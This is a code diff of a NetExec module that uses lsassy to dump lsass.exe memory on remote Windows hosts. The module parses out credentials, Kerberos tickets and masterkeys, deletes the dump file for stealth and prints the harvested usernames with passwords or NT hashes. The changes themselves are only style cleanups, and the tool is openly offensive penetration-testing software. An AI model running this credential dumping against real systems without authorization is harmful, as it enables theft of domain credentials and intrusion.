@@ -1,5 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 # Author:
 #  Romain Bentz (pixis - @hackanddo)
 # Website:
@@ -27,9 +25,7 @@ class NXCModule:
         self.method = None
 
     def options(self, context, module_options):
-        """
-        METHOD              Method to use to dump lsass.exe with lsassy
-        """
+        """METHOD              Method to use to dump lsass.exe with lsassy"""
         self.method = "comsvcs"
         if "METHOD" in module_options:
             self.method = module_options["METHOD"]
@@ -60,7 +56,7 @@ class NXCModule:
 
         dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
         if dumper is None:
-            context.log.fail("Unable to load dump method '{}'".format(self.method))
+            context.log.fail(f"Unable to load dump method '{self.method}'")
             return False
 
         file = dumper.dump()
@@ -75,13 +71,13 @@ class NXCModule:
         credentials, tickets, masterkeys = parsed
 
         file.close()
-        context.log.debug(f"Closed dumper file")
+        context.log.debug("Closed dumper file")
         file_path = file.get_file_path()
         context.log.debug(f"File path: {file_path}")
         try:
             deleted_file = ImpacketFile.delete(session, file_path)
             if deleted_file:
-                context.log.debug(f"Deleted dumper file")
+                context.log.debug("Deleted dumper file")
             else:
                 context.log.fail(f"[OPSEC] No exception, but failed to delete file: {file_path}")
         except Exception as e:
@@ -119,7 +115,7 @@ class NXCModule:
                 )
                 credentials_output.append(cred)
 
-        context.log.debug(f"Calling process_credentials")
+        context.log.debug("Calling process_credentials")
         self.process_credentials(context, connection, credentials_output)
 
     def process_credentials(self, context, connection, credentials):
@@ -128,7 +124,7 @@ class NXCModule:
         credz_bh = []
         domain = None
         for cred in credentials:
-            if cred["domain"] == None:
+            if cred["domain"] is None:
                 cred["domain"] = ""
             domain = cred["domain"]
             if "." not in cred["domain"] and cred["domain"].upper() in connection.domain.upper():
@@ -157,7 +153,7 @@ class NXCModule:
     def print_credentials(context, domain, username, password, lmhash, nthash):
         if password is None:
             password = ":".join(h for h in [lmhash, nthash] if h is not None)
-        output = "%s\\%s %s" % (domain, username, password)
+        output = f"{domain}\\{username} {password}"
         context.log.highlight(output)
 
     @staticmethod
